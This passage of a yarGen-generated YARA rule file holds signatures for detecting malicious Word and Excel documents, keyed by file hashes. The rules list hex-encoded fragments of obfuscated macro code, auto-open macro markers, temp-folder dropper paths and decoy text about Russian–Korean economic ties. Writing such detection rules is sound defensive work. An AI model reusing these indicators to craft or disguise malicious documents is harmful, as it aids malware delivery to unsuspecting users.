      $s1 = "8a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s2 = "306d9efd4eb24f1d26ef9dbe0cf8dcfe0f9ebfedbf171fe7bceed3ed71853dfe38ed27446edcdf89bfcefc5efe3d8dfbc2e01c59f655cbb413fd5ff967e267e8" ascii
      $s3 = "07f0b9ebebe9eedff11227ef8f9d8e27bfb7bcfcf0151bfdbfccb4fd567f9dbed3f4992244992e467d3ff0d2eefffb138ff6e5e7369eefeee5ee5bf588d17cdf" ascii
      $s4 = "e62fe2e767c1fecef9ddf6e6e2f98e88fe5bf686ff7b31e7c76fc75ff422cbeef8fed1f1bce3fcfd83f7bf4dbf98fe5efcee8bfb05effe8ffefee8fb53fce1f5" ascii
      $s5 = "66006600FFFFB6004A90DB00904A0000FFFFDB00DBFFFF00004A9000DB904A00B6660000B6B6B60090DBFF0000004A0000006600DBB666004A000000FFDB9000" ascii
      $s6 = "bfd8ff77eb6ffe3fe99f53eb1fe44c72564f4f92331f27e63e3cd8969e7d7ef3f1f9f7d7e44fd237d15dbbfdfff485f4cff11e72decff465390cd270ed6f99f1" ascii
      $s7 = "12bbe3fbc3fd28ff5d5f7555bde6fdec4fb5bf0f4617fd3fddbc4dff3e783e0e787d1ef6becf8fe8567eb2794cfebde7bef373ebd0ff5ef52bd3913712d50028" ascii
      $s8 = "e470d0e1e0e0000000d49484452000004760000020f080600000016cc59b3000000017352474200eece1ce90000000467414d410000b18f0bfc6105000000097" ascii
      $s9 = "2fc50c67f6dfc1f42fb77d47e1251fd9f5e1f05c57f5edfbfbeffd3f111d1f87f7bfe32bfcff2697f59df6741fee2e33f9d9fee2feeffd3ebe3e0f84febfbd7f" ascii
      $s10 = "37391f71b9e3dfdc7d4c7f25fb4b7fbf5ef99f8ebfe85587cdf1fdb3f369c7f9eb17ff6e8b7f31fcbdf9d517f61bdfe51ffdf551f6b7f943fb4beecebe4e6fd6" ascii
      $s11 = "ffff0408a0802d0104080408a080f08105080408a0802d0102080408a080f08106080708a080fc0208a08080808a080a0408a0802d0105080408a0802d010308" ascii
      $s12 = "048597300000ec300000ec301c76fe8640000ffe549444154785eec9d0d961bb98eecbd2e2fe8eee756e3cdcc62fe2592628e64028820c12cb9fcf09de3b92df" ascii
      $s13 = "8ff2dfe16fbd7275e9f05ff79bf6988efeff7cf46fd4bfd8fe33fdbff51ff9fee4f3cbf42e721ef37ef9181c0f3dde61bd72f3e1f63fd8988d73756bf42b7c7d" ascii
      $s14 = "8f2d7c89fe0edc182e23378f323fe99fc23fd4c7c4b3f131f11f12f207f0cdefc68fe16f4d1f9d781e71fe947e76fee3e0c96bff2b9df5f4c7e3d7d8c3f0f2f3" ascii
      $s15 = "2ed4f1fd3e354befe10fe65fee8e1dd887efc1dfe23f1d5f15b7db53ddef8fe507cb4be52d68cfd13d5bfd4ffd3f91374fdf1fec7fc637f287e45f787f747feb" ascii
      $s16 = "0833e0108a087081c08a080a0801408a08026060f081e08ffffffff04081408a080776f72640e084d6963726f736f667420576f72640508a0808b0208a080a08" ascii
      $s17 = "6f0872086d086108740869086f086e08a080a080a080a080a080a080a080a080a080a080a080a080a08028080201ffffffff0808a080ffffffff08a080a080a0" ascii
      $s18 = "ffffffffffffffffffffffffffffdffffff0c08a080feffffff0d08a0808508a0808608a0808708a0808808a0808908a0808fe08a0808b08a080feffffff1e08" ascii
      $s19 = "1fce1fd917eec2fef37ef75fe7eedee8cbf03b77f087f2664fc13eb730f941f52ffc7ce4f8bbeefb3f71b9f5fefff4d9224499224499224499224497e18f9c54" ascii
      $s20 = "19b1fcddf823e3eff3ef0fc23fde8fc4dd587c1f2573ef7fb8bc9efe78ff1e7e1c567f43358f91118fd93fedd781ed6fc45ffe8fce0f14e0f939f9ebcdf5416e" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625_d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf651_3 {
   meta:
      description = "DOC - from files 8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625.docx, d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625"
      hash2 = "d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f"
   strings:
      $s1 = " HYPERLINK \"http://gks.ru/bgd/Freeb04_03/LssWWW.exe/Stg/d01/249.htm\" " fullword wide
      $s2 = "http://gks.ru/bgd/Freeb04_03/LssWWW.exe/Stg/d01/249.htm" fullword wide
      $s3 = ": dvtu.customs.ru/index.php?option=com_content&view=category&id=80 " fullword wide
      $s4 = "ooperation. It is concluded that the international economic sanctions did not reduce the interest of the Korean states in cooper" ascii
      $s5 = "r Eastern regions of Russia and the countries of the Korean peninsula. There were revealed reasons for the slowing of economic c" ascii
      $s6 = ". 225-226]. " fullword wide /* hex encoded string '"R&' */
      $s7 = "4870605,7" fullword wide /* hex encoded string 'Hp`W' */
      $s8 = "Keywords: Russia " fullword ascii
      $s9 = " Republic of Korea " fullword ascii
      $s10 = " HYPERLINK \"http://minvr.ru/press-center/news/5330\" " fullword wide
      $s11 = "http://minvr.ru/press-center/news/5330" fullword wide
      $s12 = " HYPERLINK \"http://minvr.ru/press-center/news/1171/?sphrase_id=323653\" " fullword wide
      $s13 = "http://minvr.ru/press-center/news/1171/?sphrase_id=323653" fullword wide
      $s14 = "ShellV" fullword ascii
      $s15 = " investments" fullword ascii
      $s16 = " trade and economic relations " fullword ascii
      $s17 = "The Regional Economic Contacts of Russian Far East with Korean States (2010s)" fullword wide
      $s18 = "  + 1,2" fullword wide
      $s19 = "ation with the Russian Far East, but led to a slowdown in the development of foreign trade." fullword ascii
      $s20 = " North Korea " fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625_7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f_4 {
   meta:
      description = "DOC - from files 8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625.docx, 7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a.docx, d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625"
      hash2 = "7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a"
      hash3 = "d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f"
   strings:
      $s1 = "<a:clrMap xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" bg1=\"lt1\" tx1=\"dk1\" bg2=\"lt2\" tx2=\"dk2\" acce" ascii
      $s2 = "Documentj" fullword ascii
      $s3 = "Project1" fullword ascii
      $s4 = "Word.Document.8" fullword ascii /* Goodware String - occured 3 times */
      $s5 = "Macros" fullword wide /* Goodware String - occured 29 times */
      $s6 = "_VBA_PROJECT" fullword wide /* Goodware String - occured 30 times */
      $s7 = "PROJECTwm" fullword wide /* Goodware String - occured 30 times */
      $s8 = "DocumentSummaryInformation" fullword wide /* Goodware String - occured 41 times */
      $s9 = "SummaryInformation" fullword wide /* Goodware String - occured 50 times */
      $s10 = "WordDocument" fullword wide /* Goodware String - occured 52 times */
      $s11 = "_Evaluate" fullword ascii /* Goodware String - occured 1 times */
      $s12 = "lateDeri" fullword ascii
      $s13 = "t1\" accent2=\"accent2\" accent3=\"accent3\" accent4=\"accent4\" accent5=\"accent5\" accent6=\"accent6\" hlink=\"hlink\" folHlin" ascii
      $s14 = "Name=\"Project\"" fullword ascii
      $s15 = "VGlobal!" fullword ascii
      $s16 = "ThisDocument<" fullword ascii
      $s17 = "Project-" fullword ascii
      $s18 = "Microsoft Word 97-2003 Document" fullword ascii
      $s19 = "Document_Open" fullword ascii
      $s20 = "Footer Char" fullword wide
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd1_5 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "343633342B353633343635342D333938333635362F32373436" ascii /* hex encoded string '4634+5634654-3983656/2746' */
      $s2 = "35347662347866673679787967627975363772666769626766" ascii /* hex encoded string '54vb4xfg6yxygbyu67rfgibgf' */
      $s3 = "373538393635343635342B3433343333372A34353633343533" ascii /* hex encoded string '7589654654+434337*4563453' */
      $s4 = "73646664736673203D20226148523055446F764C3268316448" ascii /* hex encoded string 'sdfdsfs = "aHR0UDovL2h1dH' */
      $s5 = "20206B6A7373647975667364663772656967203D206B6A7373" ascii /* hex encoded string '  kjssdyufsdf7reig = kjss' */
      $s6 = "626E667237203D202239333933393537333734332A33343336" ascii /* hex encoded string 'bnfr7 = "93939573743*3436' */
      $s7 = "342A283334363337383533342D333436333734292B34383334" ascii /* hex encoded string '4*(346378534-346374)+4834' */
      $s8 = "0043003b005c00660061006b00650070006100740048005c00610062006400740066006800670058004700680067006800670068009c002e0053006300740013" ascii
      $s9 = "80067006800670068009c002e00530063007400C6AFABEC197FD211978E0000F8757E2a000000000000000000000000000000000000000000000000FFFFFFFF0" ascii
      $s10 = "000F00050054004D00700025005c00610062006400740066006800670058006700680067006800670068009c002e00530063007400C6AFABEC197FD211978E" ascii
      $s11 = "0000000C000000000000046020000000303000000000000c00000000000004600001A00000025544D50255c61626474666867686764676867689c2e534354000" ascii
      $s12 = "000433a5c43626b65706144555c61626474666867686" ascii
      $s13 = "0025544D50255c61626474666867686764676867689c2e534354000E00ADDE" ascii
      $s14 = "35220D0A202020207436373666747466373534766234786667" ascii
      $s15 = "25544D50255c61626474666867686764676867689c2e534354" ascii
      $s16 = "764676867689c2e536354" ascii
      $s17 = "00610062006300740066006800670058006700680067006800670068009c002e005300630074001f" ascii
      $s18 = "0054004D00700025005c00610062006400740066006800670058006700680067006800670068009c002e00530063007400C6" ascii
      $s19 = "0433a5c43626b65706144555c61626474666867686" ascii
      $s20 = "676867689c2e536354000000030020000000433a5c43626b65706144555c61626474666867686" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619_e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead_6 {
   meta:
      description = "DOC - from files 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc, e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
      hash2 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
      hash3 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
   strings:
      $s1 = "36667474663735347662347866673679787967627975363772" ascii /* hex encoded string '6fttf754vb4xfg6yxygbyu67r' */
      $s2 = "362F32373436373538393635343635342B3433343333372A34" ascii /* hex encoded string '6/27467589654654+434337*4' */
      $s3 = "666769626766626E667237203D202239333933393537333734" ascii /* hex encoded string 'fgibgfbnfr7 = "9393957374' */
      $s4 = "332A33343336343633342B353633343635342D333938333635" ascii /* hex encoded string '3*34364634+5634654-398365' */
      $s5 = "353633343533342A283334363337383533342D333436333734" ascii /* hex encoded string '5634534*(346378534-346374' */
      $s6 = "0043003b005c00660061006b00650070006100740048005c00610062006400740066006800670058004700680067006800670068009d002e0053006300740013" ascii
      $s7 = "80067006800670068009d002e00530063007400C6AFABEC197FD211978E0000F8757E2a000000000000000000000000000000000000000000000000FFFFFFFF0" ascii
      $s8 = "000F00050054004D00700025005c00610062006400740066006800670058006700680067006800670068009d002e00530063007400C6AFABEC197FD211978E" ascii
      $s9 = "0000000C000000000000046020000000303000000000000c00000000000004600001A00000025544D50255c61626474666867686764676867689d2e534354000" ascii
      $s10 = "00610062006300740066006800670058006700680067006800670068009d002e005300630074001f" ascii
      $s11 = "0433a5c43626b65706144775c61626474666867686" ascii
      $s12 = "676867689d2e536354000000030020000000433a5c43626b65706144775c61626474666867686" ascii
      $s13 = "764676867689d2e536354" ascii
      $s14 = "433a5c6A736473546767665c61626474666867584764676867689d2e536354" ascii
      $s15 = "25544D50255c61626474666867686764676867689d2e534354" ascii
      $s16 = "000433a5c43626b65706144775c61626474666867686" ascii
      $s17 = "0025544D50255c61626474666867686764676867689d2e534354000E00ADDE" ascii
      $s18 = "0043003a005c00440061006b00650070006100550048005c00610062006400740066006800670058006700680067006800670068009d002e0053006300740001" ascii
      $s19 = "0054004D00700025005c00610062006400740066006800670058006700680067006800670068009d002e00530063007400C6" ascii
      $s20 = "61626474666867586764676867689d2e536354" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33_433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff_7 {
   meta:
      description = "DOC - from files e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
      hash2 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
   strings:
      $s1 = "343533342A283334363337383533342D333436333734292B34" ascii /* hex encoded string '4534*(346378534-346374)+4' */
      $s2 = "373436373538393635343635342B3433343333372A34353633" ascii /* hex encoded string '7467589654654+434337*4563' */
      $s3 = "3772656967203D206B6A737364797566736466377265696720" ascii /* hex encoded string '7reig = kjssdyufsdf7reig ' */
      $s4 = "2A33343336343633342B353633343635342D33393833363536" ascii /* hex encoded string '*34364634+5634654-3983656' */
      $s5 = "203D202239333933393537333734332A33343336343633342B" ascii /* hex encoded string ' = "93939573743*34364634+' */
      $s6 = "626766626E667237203D202239333933393537333734332A33" ascii /* hex encoded string 'bgfbnfr7 = "93939573743*3' */
      $s7 = "3633343635342D333938333635362F32373436373538393635" ascii /* hex encoded string '634654-3983656/2746758965' */
      $s8 = "353633343635342D333938333635362F323734363735383936" ascii /* hex encoded string '5634654-3983656/274675896' */
      $s9 = "3633343533342A283334363337383533342D33343633373429" ascii /* hex encoded string '634534*(346378534-346374)' */
      $s10 = "35343635342B3433343333372A34353633343533342A283334" ascii /* hex encoded string '54654+434337*45634534*(34' */
      $s11 = "66673679787967627975363772666769626766626E66723720" ascii /* hex encoded string 'fg6yxygbyu67rfgibgfbnfr7 ' */
      $s12 = "6769626766626E667237203D20223933393339353733373433" ascii /* hex encoded string 'gibgfbnfr7 = "93939573743' */
      $s13 = "74663735347662347866673679787967627975363772666769" ascii /* hex encoded string 'tf754vb4xfg6yxygbyu67rfgi' */
      $s14 = "343635342B3433343333372A34353633343533342A28333436" ascii /* hex encoded string '4654+434337*45634534*(346' */
      $s15 = "3D202239333933393537333734332A33343336343633342B35" ascii /* hex encoded string '= "93939573743*34364634+5' */
      $s16 = "2F32373436373538393635343635342B3433343333372A3435" ascii /* hex encoded string '/27467589654654+434337*45' */
      $s17 = "343336343633342B353633343635342D333938333635362F32" ascii /* hex encoded string '4364634+5634654-3983656/2' */
      $s18 = "66747466373534766234786667367978796762797536377266" ascii /* hex encoded string 'fttf754vb4xfg6yxygbyu67rf' */
      $s19 = "7866673679787967627975363772666769626766626E667237" ascii /* hex encoded string 'xfg6yxygbyu67rfgibgfbnfr7' */
      $s20 = "0D0A2020202020202020202020206B6A737364797566736466" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0_8 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
      hash3 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "34332A33343336343633342B353633343635342D3339383336" ascii /* hex encoded string '43*34364634+5634654-39836' */
      $s2 = "333635362F32373436373538393635343635342B3433343333" ascii /* hex encoded string '3656/27467589654654+43433' */
      $s3 = "333734332A33343336343633342B353633343635342D333938" ascii /* hex encoded string '3743*34364634+5634654-398' */
      $s4 = "35342B3433343333372A34353633343533342A283334363337" ascii /* hex encoded string '54+434337*45634534*(34637' */
      $s5 = "343635342D333938333635362F323734363735383936353436" ascii /* hex encoded string '4654-3983656/274675896546' */
      $s6 = "202020202020202020206B6A73736479756673646637726569" ascii /* hex encoded string '          kjssdyufsdf7rei' */
      $s7 = "34353633343533342A283334363337383533342D3334363337" ascii /* hex encoded string '45634534*(346378534-34637' */
      $s8 = "372A34353633343533342A283334363337383533342D333436" ascii /* hex encoded string '7*45634534*(346378534-346' */
      $s9 = "74363736667474663735347662347866673679787967627975" ascii /* hex encoded string 't676fttf754vb4xfg6yxygbyu' */
      $s10 = "3679787967627975363772666769626766626E667237203D20" ascii /* hex encoded string '6yxygbyu67rfgibgfbnfr7 = ' */
      $s11 = "35362F32373436373538393635343635342B3433343333372A" ascii /* hex encoded string '56/27467589654654+434337*' */
      $s12 = "363772666769626766626E667237203D202239333933393537" ascii /* hex encoded string '67rfgibgfbnfr7 = "9393957' */
      $s13 = "72666769626766626E667237203D2022393339333935373337" ascii /* hex encoded string 'rfgibgfbnfr7 = "939395737' */
      $s14 = "37366674746637353476623478666736797879676279753637" ascii /* hex encoded string '76fttf754vb4xfg6yxygbyu67' */
      $s15 = "2239333933393537333734332A33343336343633342B353633" ascii /* hex encoded string '"93939573743*34364634+563' */
      $s16 = "383533342D333436333734292B3438333435220D0A20202020" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _f2762acdc3244d8adb11c318ac93b1ef63db750245a5f77e258af676d39e85b4_8d0ff95405ce9a8a7e23a3d1bd7f7cab0bdeb2f13e88d6dd034a59cb73_9 {
   meta:
      description = "DOC - from files f2762acdc3244d8adb11c318ac93b1ef63db750245a5f77e258af676d39e85b4.xlsx, 8d0ff95405ce9a8a7e23a3d1bd7f7cab0bdeb2f13e88d6dd034a59cb7313742e.xlsx, 41aa359ecdec67dd6362b8082d3d1fcc37bcca016e8f8b491bdca26a3516a085.xlsx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "f2762acdc3244d8adb11c318ac93b1ef63db750245a5f77e258af676d39e85b4"
      hash2 = "8d0ff95405ce9a8a7e23a3d1bd7f7cab0bdeb2f13e88d6dd034a59cb7313742e"
      hash3 = "41aa359ecdec67dd6362b8082d3d1fcc37bcca016e8f8b491bdca26a3516a085"
   strings:
      $s1 = "EncryptedPackage2" fullword wide
      $s2 = "Microsoft Enhanced RSA and AES Cryptographic Provider" fullword wide /* Goodware String - occured 153 times */
      $s3 = "StrongEncryptionDataSpace" fullword wide /* Goodware String - occured 1 times */
      $s4 = "Microsoft.Container.EncryptionTransform" fullword wide /* Goodware String - occured 1 times */
      $s5 = "{FF9A3F03-56EF-4613-BDD5-5A41C1D07246}N" fullword wide
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 4000KB and ( all of them )
      ) or ( all of them )
}

rule _199b413b421644c1f385452967a4b287e792d6cc295427993fd696583cc1ab0c_7402820a9e624e3c35ce2275dd9e6d73e906d976c8e4da6a140ca7cb7d_10 {
   meta:
      description = "DOC - from files 199b413b421644c1f385452967a4b287e792d6cc295427993fd696583cc1ab0c.doc, 7402820a9e624e3c35ce2275dd9e6d73e906d976c8e4da6a140ca7cb7daab2cc.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "199b413b421644c1f385452967a4b287e792d6cc295427993fd696583cc1ab0c"
      hash2 = "7402820a9e624e3c35ce2275dd9e6d73e906d976c8e4da6a140ca7cb7daab2cc"
   strings:
      $s1 = "word/theme/theme1.xml" fullword ascii /* Goodware String - occured 3 times */
      $s2 = "word/styles.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s3 = "word/theme/theme1.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s4 = "word/settings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s5 = "word/webSettings.xml" fullword ascii /* Goodware String - occured 3 times */
      $s6 = "word/_rels/document.xml.relsPK" fullword ascii /* Goodware String - occured 3 times */
      $s7 = "word/document.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s8 = "word/webSettings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s9 = "word/fontTable.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "word/_rels/document.xml.rels " fullword ascii /* Goodware String - occured 3 times */
      $s11 = "word/fontTable.xml" fullword ascii /* Goodware String - occured 5 times */
      $s12 = "word/document.xml" fullword ascii /* Goodware String - occured 5 times */
      $s13 = "word/styles.xml" fullword ascii /* Goodware String - occured 5 times */
      $s14 = "word/settings.xml" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x4b50 and filesize < 60KB and ( 8 of them )
      ) or ( all of them )
}

rule _7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a_d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf651_11 {
   meta:
      description = "DOC - from files 7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a.docx, d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a"
      hash2 = "d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f"
   strings:
      $s1 = "omation" fullword ascii
      $s2 = "e2.tlb" fullword ascii
      $s3 = "ENormal" fullword ascii
      $s4 = "\\G{00020" fullword ascii
      $s5 = "\\Windows" fullword ascii /* Goodware String - occured 4 times */
      $s6 = "2.0#0#C:" fullword ascii
      $s7 = "D04C-5BF" fullword ascii
      $s8 = "A-101B-BHDE5" fullword ascii
      $s9 = "#OLE Aut" fullword ascii
      $s10 = "!G{2DF8" fullword ascii
      $s11 = "! Offic" fullword ascii
      $s12 = "0046}#" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0_12 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
   strings:
      $s1 = "36343633342B353633343635342D333938333635362F323734" ascii /* hex encoded string '64634+5634654-3983656/274' */
      $s2 = "36373538393635343635342B3433343333372A343536333435" ascii /* hex encoded string '67589654654+434337*456345' */
      $s3 = "34766234786667367978796762797536377266676962676662" ascii /* hex encoded string '4vb4xfg6yxygbyu67rfgibgfb' */
      $s4 = "3633342B353633343635342D333938333635362F3237343637" ascii /* hex encoded string '634+5634654-3983656/27467' */
      $s5 = "33342A283334363337383533342D333436333734292B343833" ascii /* hex encoded string '34*(346378534-346374)+483' */
      $s6 = "3538393635343635342B3433343333372A3435363334353334" ascii /* hex encoded string '589654654+434337*45634534' */
      $s7 = "37353476623478666736797879676279753637726667696267" ascii /* hex encoded string '754vb4xfg6yxygbyu67rfgibg' */
      $s8 = "66626E667237203D202239333933393537333734332A333433" ascii /* hex encoded string 'fbnfr7 = "93939573743*343' */
      $s9 = "2A283334363337383533342D333436333734292B3438333435" ascii /* hex encoded string '*(346378534-346374)+48345' */
      $s10 = "6E667237203D202239333933393537333734332A3334333634" ascii /* hex encoded string 'nfr7 = "93939573743*34364' */
      $s11 = "0D0A64666764666764666764203D2064666764666764666764" ascii
      $s12 = "34292B3438333435220D0A2020202074363736667474663735" ascii
      $s13 = "333734292B3438333435220D0A202020207436373666747466" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead_13 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
   strings:
      $s1 = "37333734332A33343336343633342B353633343635342D3339" ascii /* hex encoded string '73743*34364634+5634654-39' */
      $s2 = "38333635362F32373436373538393635343635342B34333433" ascii /* hex encoded string '83656/27467589654654+4343' */
      $s3 = "6C617573667963686B73203D2077736C617573667963686B73" ascii /* hex encoded string 'lausfychks = wslausfychks' */
      $s4 = "75363772666769626766626E667237203D2022393339333935" ascii /* hex encoded string 'u67rfgibgfbnfr7 = "939395' */
      $s5 = "33372A34353633343533342A283334363337383533342D3334" ascii /* hex encoded string '37*45634534*(346378534-34' */
      $s6 = "0D0A202020202020202020202020697672656A6B203D206976" ascii
      $s7 = "220D0A77736C617573667963686B73203D2077736C61757366" ascii
      $s8 = "C38DC592C38DC592C38DC592C38DC592C38DC592C38DC59220" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625_7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f_14 {
   meta:
      description = "DOC - from files 8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625.docx, 7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a.docx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625"
      hash2 = "7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Micr" wide
